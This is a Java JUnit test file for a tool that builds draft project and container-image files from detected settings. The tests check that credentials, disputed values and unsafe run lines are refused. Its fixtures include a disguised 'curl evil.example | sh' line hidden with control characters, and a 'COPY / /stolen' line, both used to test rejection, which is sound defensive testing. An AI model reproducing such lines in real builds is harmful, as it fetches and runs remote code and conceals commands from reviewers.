package org.fuin.porelo.app;

import static org.assertj.core.api.Assertions.assertThat;

import java.io.StringReader;
import java.util.List;
import org.fuin.porelo.core.project.ProjectReader;
import org.fuin.porelo.ecosystem.api.Detection;
import org.fuin.porelo.ecosystem.api.Finding;
import org.fuin.porelo.ecosystem.api.Unplaced;
import org.junit.jupiter.api.Test;

/** Prevents ambiguous rules and credentials from becoming project policy. */
class ProjectProposalTest {
    private Finding finding(Finding.Part part, String key, String value, int line) {
        return new Finding(
                part, key, value, "settings.xml", line, Finding.Origin.CHECKOUT, false, "");
    }

    @Test
    void agreementKeepsEverySourceAndDisagreementNeverBecomesPolicy() {
        var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "first",
                new Detection(
                        List.of(
                                finding(Finding.Part.RULES, "host.repo.example.org", "yes", 1),
                                finding(Finding.Part.TOOLS, "package.jq", "1", 2)),
                        List.of()));
        proposal.add(
                "second",
                new Detection(
                        List.of(
                                finding(Finding.Part.RULES, "host.repo.example.org", "yes", 3),
                                finding(Finding.Part.TOOLS, "package.jq", "2", 4)),
                        List.of()));
        var answer = proposal.answer();
        assertThat(answer.get("values").toString())
                .as("agreement retains both source lines")
                .contains("line=1", "line=3");
        assertThat(answer.get("disagreements").toString())
                .as("conflicting values remain available for review")
                .contains("package.jq", "value=1", "value=2");
        assertThat(answer.get("draft").toString())
                .as("a disputed package cannot be installed")
                .contains("repo.example.org")
                .doesNotContain("jq");
        assertThat(
                        ProjectReader.read(
                                        new StringReader(answer.get("draft").toString()), "draft")
                                .repositories())
                .as("the shown draft reads")
                .hasSize(1);
    }

    @Test
    void unknownFindingsKeepTheFileAndLineWhereTheyAreSet() {
        var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "first",
                new Detection(
                        List.of(
                                new Finding(
                                        Finding.Part.TOOLS,
                                        "runtime.version",
                                        "",
                                        "settings.xml",
                                        5,
                                        Finding.Origin.CHECKOUT,
                                        true,
                                        "computed")),
                        List.of()));
        var answer = proposal.answer();
        assertThat(answer.get("values").toString())
                .as("an unknown setting is visible with where it is set")
                .contains("unknown=true", "settings.xml", "line=5");
    }

    @Test
    void aToolWithoutAGenericRuleIsListedAsNotPlacedAndLeftOutOfTheDraft() {
        var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "first",
                new Detection(
                        List.of(finding(Finding.Part.TOOLS, "runtime.version", "25", 6)),
                        List.of()));
        var answer = proposal.answer();
        assertThat(answer.get("not_placed").toString())
                .as("a tool with no generic rule remains available to place")
                .contains("runtime.version", "25", "settings.xml");
        assertThat(answer.get("draft").toString())
                .as("the draft holds only what it places")
                .doesNotContain("runtime.version");
    }

    @Test
    void credentialsNeverExposeTheirValueInTheDraftOrTheAnswer() {
        var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "first",
                new Detection(
                        List.of(
                                finding(
                                        Finding.Part.RULES,
                                        "credential.private",
                                        "password-fixture",
                                        7)),
                        List.of()));
        var answer = proposal.answer();
        assertThat(answer.toString())
                .as("a credential's value reaches neither draft nor answer")
                .doesNotContain("password-fixture");
        assertThat(answer.get("credentials_needed").toString())
                .as("the answer tells how to store the needed identifier")
                .contains("private", "porelo vault put private");
    }

    @Test
    void unplacedMaterialKeepsItsSourceAndExplanation() {
        var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "first",
                new Detection(List.of(), List.of(new Unplaced("settings.xml", 8, "conditional"))));
        assertThat(proposal.answer().get("unplaced").toString())
                .as("unplaced material cannot disappear silently")
                .contains("settings.xml", "line=8", "conditional", "first");
    }

    @org.junit.jupiter.params.ParameterizedTest
    @org.junit.jupiter.params.provider.ValueSource(
            strings = {"on", "off", "yes", "no", "0123", "1.20"})
    void aValidRepositoryNameKeepsItsExactSpellingThroughYaml(String name) {
        var answer = new ProjectProposal(name, null, null, null).answer();
        var read = ProjectReader.read(new StringReader(answer.get("draft").toString()), "draft");
        assertThat(read.repositories().getFirst().name())
                .as("YAML scalar resolution cannot rename a repository")
                .isEqualTo(name);
    }

    @Test
    void aDraftThatTheProjectReaderRefusesCannotBeShown() {
        var proposal = new ProjectProposal("sample", "--unsafe", null, null);
        org.assertj.core.api.Assertions.assertThatThrownBy(proposal::answer)
                .as("the draft passes through the actual reader before it can be shown")
                .isInstanceOf(org.fuin.porelo.core.project.ProjectException.class);
    }

    @Test
    void aGenericPackageGetsAnImageSnippetWithItsSource() {
        var proposal =
                new ProjectProposal("sample", "https://example.org/sample.git", null, "optional");
        proposal.add(
                "first",
                new Detection(
                        List.of(finding(Finding.Part.TOOLS, "package.jq", "", 9)), List.of()));
        var draft = proposal.answer().get("draft").toString();
        assertThat(draft)
                .as("generic packages get a reviewable installation")
                .contains("apt-get install", "jq", "review: optional");
        assertThat(proposal.tools())
                .as("the answer says where each package was read")
                .extracting(ProjectProposal.Placed::source)
                .containsExactly("settings.xml");
        assertThat(ProjectReader.read(new StringReader(draft), "draft").imageSnippet())
                .as("the image's lines are the project's, understood by the reader")
                .contains("apt-get install -y --no-install-recommends jq");
    }

    @Test
    void aPackagesValueIsThePackageToInstallNotAVersionOfIt() {
        final ProjectProposal proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "maven",
                new Detection(
                        List.of(
                                finding(
                                        Finding.Part.TOOLS,
                                        "package.openjdk-25-jdk-headless",
                                        "openjdk-25-jdk-headless",
                                        9)),
                        List.of()));

        assertThat(String.valueOf(proposal.answer().get("draft")))
                .contains("--no-install-recommends openjdk-25-jdk-headless ")
                .doesNotContain("=openjdk");
    }

    @Test
    void aDraftsImageLinesHoldNoIndentation() {
        final ProjectProposal proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "maven",
                new Detection(
                        List.of(finding(Finding.Part.TOOLS, "package.maven", "", 9)), List.of()));
        final String draft = proposal.answer().get("draft").toString();

        assertThat(ProjectReader.read(new StringReader(draft), "draft").imageSnippet())
                .startsWith("RUN apt-get update");
    }

    @Test
    void aDraftWithNoProjectNamedTakesItsNameFromItsRepository() {
        assertThat(draftNamed("utils4j")).contains("name: utils4j-project");
        assertThat(draftNamed("a.b")).contains("name: a-b-project");
        assertThat(draftNamed("x".repeat(60))).contains("name: " + "x".repeat(32) + "-project");
        assertThat(draftNamed("x".repeat(31) + "-y"))
                .contains("name: " + "x".repeat(31) + "-project");
        assertThat(draftNamed("proposed")).contains("name: proposed-project");
    }

    @Test
    void aProposedProjectLeavesATaskNamedAfterItsRepositoryRoomToStart() {

        // A start with no name took 'porelo-<repository>-project-<repository>', 68 characters for a
        // 26-character repository, and refused its own choice.
        final String repository = "example-shop-api-templates";
        final String project = ProjectProposal.projectName(repository);

        assertThat(org.fuin.porelo.runtime.ContainerName.refusal(project, "a".repeat(16)))
                .as("a project proposed for any repository leaves a task 16 characters")
                .isEmpty();
        assertThat(
                        org.fuin.porelo.runtime.ContainerName.refusal(
                                ProjectProposal.projectName("x".repeat(80)), "a".repeat(16)))
                .as("even for the longest repository name")
                .isEmpty();
    }

    @Test
    void aProposedProjectIsNeverNamedLikeItsRepository() {

        // Cut back to a word, '<25 characters>-project' became the repository's own name again,
        // which a project file refuses.
        final String repository = "example-shop-api-template-project";

        assertThat(ProjectProposal.projectName(repository))
                .as("the project's name and its repository's differ")
                .isNotEqualTo(repository);
        assertThat(draftNamed(repository)).as("the draft reads as a project").contains("name: ");
    }

    private static String draftNamed(final String repository) {
        return new ProjectProposal(repository, null, null, null, null)
                .answer()
                .get("draft")
                .toString();
    }

    @Test
    void aValueFromNoFileIsSaidByItsNoteAndNotByALineZero() {
        final ProjectProposal proposal = new ProjectProposal("shop", null, null, null, null);
        proposal.add(
                "maven",
                new Detection(
                        List.of(
                                new Finding(
                                        Finding.Part.RULES,
                                        "host.repo.maven.apache.org",
                                        "yes",
                                        "",
                                        0,
                                        Finding.Origin.MACHINE,
                                        false,
                                        "built into Maven")),
                        List.of()));

        assertThat(proposal.answer().get("draft").toString()).doesNotContain(":0");
        assertThat(proposal.notesForAPerson())
                .containsExactly("maven: repo.maven.apache.org: built into Maven");
    }

    @Test
    void whatFilingCannotCarryIsSaidForAPersonToAddByHand() {
        var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "only",
                new Detection(
                        List.of(
                                finding(Finding.Part.RULES, "host.repo.example.org", "yes", 1),
                                finding(Finding.Part.TOOLS, "package.jq", "1", 2)),
                        List.of()));
        proposal.answer();

        assertThat(proposal.row().toString())
                .as("the row names the repository only")
                .doesNotContain("repo.example.org", "jq");
        assertThat(proposal.byHand())
                .as("nothing found for the project's image and egress is silently lost")
                .anyMatch(line -> line.startsWith("image.run: ") && line.contains(" 1 "))
                .contains("egress.domains: repo.example.org");
    }

    private static final String JAVA =
            "RUN set -eu; curl -fsSL -o /tmp/java.tgz 'https://example.org/java.tgz'\n";

    private static final String MAVEN = "RUN echo maven\n";

    private static org.fuin.porelo.core.project.file.Image image(final String draft) {
        return org.fuin.porelo.core.project.file.ProjectFileReader.read(
                        new StringReader(draft), "draft")
                .image();
    }

    @Test
    void runLinesAreJoinedInTheOrderOfTheirNamesAndEnvGoesIntoTheImage() {
        var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "maven",
                new Detection(
                        List.of(
                                finding(Finding.Part.TOOLS, "run.maven", MAVEN, 1),
                                finding(Finding.Part.TOOLS, "run.java", JAVA, 2),
                                finding(Finding.Part.TOOLS, "env.JAVA_HOME", "/opt/java", 3),
                                finding(Finding.Part.TOOLS, "package.gcc", "", 4)),
                        List.of()));

        final String draft = proposal.answer().get("draft").toString();

        assertThat(image(draft).run())
                .as("packages first, then each plugin's lines whole, java before maven")
                .isEqualTo(
                        "RUN apt-get update && apt-get install -y --no-install-recommends gcc"
                                + " && rm -rf /var/lib/apt/lists/*\n"
                                + JAVA
                                + MAVEN);
        assertThat(image(draft).env())
                .containsExactly(java.util.Map.entry("JAVA_HOME", "/opt/java"));
        assertThat(proposal.imageLines())
                .extracting(ProjectProposal.Placed::what, ProjectProposal.Placed::value)
                .as("a person reads every fetched line and variable whole")
                .containsExactly(
                        org.assertj.core.groups.Tuple.tuple("image line", JAVA.strip()),
                        org.assertj.core.groups.Tuple.tuple("image line", MAVEN.strip()),
                        org.assertj.core.groups.Tuple.tuple("image env", "JAVA_HOME=/opt/java"));
        assertThat(proposal.byHand()).contains("image.env: JAVA_HOME: /opt/java");
    }

    @Test
    void twoPluginsGivingOneRunOrEnvKeyTwoValuesDisagreeAndNeitherIsWritten() {
        var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "first",
                new Detection(
                        List.of(
                                finding(Finding.Part.TOOLS, "run.java", JAVA, 1),
                                finding(Finding.Part.TOOLS, "env.JAVA_HOME", "/opt/java", 2)),
                        List.of()));
        proposal.add(
                "second",
                new Detection(
                        List.of(
                                finding(Finding.Part.RULES, "run.java", MAVEN, 1),
                                finding(Finding.Part.TOOLS, "env.JAVA_HOME", "/opt/jdk", 2)),
                        List.of()));

        final var answer = proposal.answer();

        assertThat(answer.get("disagreements").toString())
                .as("each key is a disagreement, whatever part a plugin put it in")
                .contains("run.java", "env.JAVA_HOME");
        assertThat(image(answer.get("draft").toString()).run()).isNull();
        assertThat(image(answer.get("draft").toString()).env()).isEmpty();
        assertThat(proposal.imageLines()).isEmpty();
    }

    @Test
    void aVariablePoreloSetsInEveryTaskIsRefusedPathAmongThem() {
        var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "maven",
                new Detection(
                        List.of(
                                finding(
                                        Finding.Part.TOOLS,
                                        "env.PATH",
                                        "/opt/java/bin:/usr/bin",
                                        1),
                                finding(Finding.Part.TOOLS, "env.PORELO_TASK", "taken", 2),
                                finding(Finding.Part.TOOLS, "env.HOME", "/root", 3),
                                finding(Finding.Part.TOOLS, "env.JAVA_HOME", "/opt/java", 4)),
                        List.of()));

        final var answer = proposal.answer();

        assertThat(image(answer.get("draft").toString()).env())
                .as("only a variable of the image's own is written")
                .containsExactly(java.util.Map.entry("JAVA_HOME", "/opt/java"));
        assertThat(proposal.refusals())
                .as("each refused one is said, with its plugin")
                .hasSize(3)
                .anyMatch(each -> each.startsWith("maven: env.PATH is left out: "))
                .anyMatch(each -> each.startsWith("maven: env.PORELO_TASK is left out: "))
                .anyMatch(each -> each.startsWith("maven: env.HOME is left out: "));
        assertThat(answer.get("refused")).isEqualTo(proposal.refusals());
    }

    @Test
    void runLinesHoldingATabAreDroppedAsTheQuestionCouldNotShowThemAsTheyRun() {
        var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "maven",
                new Detection(
                        List.of(finding(Finding.Part.TOOLS, "run.java", "RUN printf 'a\tb'\n", 1)),
                        List.of()));

        assertThat(proposal.answer().get("draft").toString()).doesNotContain("printf");
        assertThat(proposal.refusals())
                .containsExactly(
                        "maven: run.java is left out: it holds a control character or a tab");
    }

    @Test
    void runLinesHoldingAControlCharacterAreDroppedSinceAPersonCouldNotReadThem() {
        var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "maven",
                new Detection(
                        List.of(
                                finding(
                                        Finding.Part.TOOLS,
                                        "run.java",
                                        "RUN echo shown\r\u001b[2KRUN curl evil.example | sh\n",
                                        1)),
                        List.of()));

        assertThat(proposal.answer().get("draft").toString()).doesNotContain("evil.example");
        assertThat(proposal.refusals())
                .containsExactly(
                        "maven: run.java is left out: it holds a control character or a tab");
    }

    @Test
    void runLinesTheModelRefusesAreDroppedWholeWithANote() {
        var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "maven",
                new Detection(
                        List.of(
                                finding(
                                        Finding.Part.TOOLS,
                                        "run.java",
                                        JAVA + "USER root\nCOPY / /stolen\n",
                                        1),
                                finding(Finding.Part.TOOLS, "run.maven", MAVEN, 2)),
                        List.of()));

        final String draft = proposal.answer().get("draft").toString();

        assertThat(draft)
                .as("no line of the refused key is written, its harmless ones neither")
                .doesNotContain("USER", "COPY", "java.tgz");
        assertThat(image(draft).run()).isEqualTo(MAVEN);
        assertThat(proposal.refusals())
                .singleElement()
                .asString()
                .startsWith("maven: run.java is left out: ")
                .contains("only RUN, ARG and ENV");
    }

    @Test
    void aRunLineCopyingFromAPinnedImageIsTaken() {
        final String copy =
                "COPY --from=ghcr.io/example/tool@sha256:"
                        + "0123456789abcdef".repeat(4)
                        + " /usr/bin/tool /usr/local/bin/tool\n";
        var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "maven",
                new Detection(
                        List.of(
                                finding(Finding.Part.TOOLS, "run.java", JAVA + copy, 1),
                                finding(Finding.Part.TOOLS, "run.maven", MAVEN, 2)),
                        List.of()));

        assertThat(image(proposal.answer().get("draft").toString()).run())
                .as("the pinned copy kept with the key's other lines")
                .isEqualTo(JAVA + copy + MAVEN);
        assertThat(proposal.refusals()).isEmpty();
    }

    @Test
    void aRepositoryAndASettingAnAdapterFoundBecomeItsToolRepositoryAndItsBlock() {
        var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "maven",
                new Detection(
                        List.of(
                                finding(
                                        Finding.Part.RULES,
                                        "repository.corp",
                                        "https://repo.example.org/maven/",
                                        3),
                                finding(Finding.Part.RULES, "extension.mirrorOf.corp", "*", 4)),
                        List.of()));

        var answer = proposal.answer();
        final org.fuin.porelo.core.project.Project read =
                ProjectReader.read(new StringReader(answer.get("draft").toString()), "draft");

        assertThat(read.toolRepositories())
                .as("the repository is declared for the adapter that found it")
                .containsExactly(
                        new org.fuin.porelo.core.project.ToolRepository(
                                "maven", "corp", "https://repo.example.org/maven/"));
        assertThat(read.egress().domains())
                .as("with its host beside it in the egress")
                .contains("repo.example.org");
        assertThat(read.extensions())
                .as("the setting is kept for that adapter, its key's dots nesting")
                .containsExactly(
                        java.util.Map.entry(
                                "maven",
                                java.util.Map.of("mirrorOf", java.util.Map.of("corp", "*"))));
        assertThat(answer.get("not_placed").toString())
                .as("neither is left for a person to place")
                .doesNotContain("repository.corp", "extension.mirrorOf");
    }

    private static Finding found(
            final String key, final String value, final Finding.Origin origin) {
        return new Finding(Finding.Part.RULES, key, value, "settings.xml", 1, origin, false, "");
    }

    private static List<org.fuin.porelo.core.project.ToolRepository> repositories(
            final ProjectProposal proposal) {
        return ProjectReader.read(
                        new StringReader(String.valueOf(proposal.answer().get("draft"))), "draft")
                .toolRepositories();
    }

    @Test
    void aRepositoryThePersonHoldsACredentialForNamesItAndIsReadThroughTheBroker() {
        final var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "maven",
                new Detection(
                        List.of(
                                found(
                                        "repository.inhouse",
                                        "https://repo.example.org/maven/",
                                        Finding.Origin.YOURS),
                                found("credential.inhouse", "inhouse", Finding.Origin.YOURS)),
                        List.of()));

        assertThat(repositories(proposal))
                .singleElement()
                .satisfies(each -> assertThat(each.credential()).isEqualTo("inhouse"));
    }

    @Test
    void aRepositoryOnlyTheCheckoutNamesNeverTakesThePersonsCredential() {
        // A checkout naming a repository like one the person holds a credential for would send
        // their secret, through the broker, to an address of the checkout's choosing.
        final var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "maven",
                new Detection(
                        List.of(
                                found(
                                        "repository.inhouse",
                                        "https://elsewhere.example/maven/",
                                        Finding.Origin.CHECKOUT),
                                found("credential.inhouse", "inhouse", Finding.Origin.YOURS)),
                        List.of()));

        assertThat(repositories(proposal))
                .singleElement()
                .satisfies(each -> assertThat(each.credential()).isNull());
    }

    @Test
    void anotherAdaptersCredentialOfTheSameNameIsNotTaken() {
        final var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "maven",
                new Detection(
                        List.of(
                                found(
                                        "repository.inhouse",
                                        "https://repo.example.org/maven/",
                                        Finding.Origin.YOURS)),
                        List.of()));
        proposal.add(
                "npm",
                new Detection(
                        List.of(found("credential.inhouse", "inhouse", Finding.Origin.YOURS)),
                        List.of()));

        assertThat(repositories(proposal))
                .singleElement()
                .satisfies(each -> assertThat(each.credential()).isNull());
    }

    @Test
    void aCredentialTheBrokerCannotServeIsSaidAndTheRepositoryKeepsItsAddress() {
        final var proposal = new ProjectProposal("sample", null, null, null);
        proposal.add(
                "maven",
                new Detection(
                        List.of(
                                found(
                                        "repository.Inhouse",
                                        "https://repo.example.org/maven/",
                                        Finding.Origin.YOURS),
                                found("credential.Inhouse", "Inhouse", Finding.Origin.YOURS)),
                        List.of()));

        assertThat(repositories(proposal))
                .singleElement()
                .satisfies(each -> assertThat(each.credential()).isNull());
        assertThat(proposal.refusals())
                .anySatisfy(
                        each -> assertThat(each).contains("'Inhouse'", "without its credential"));
    }
}
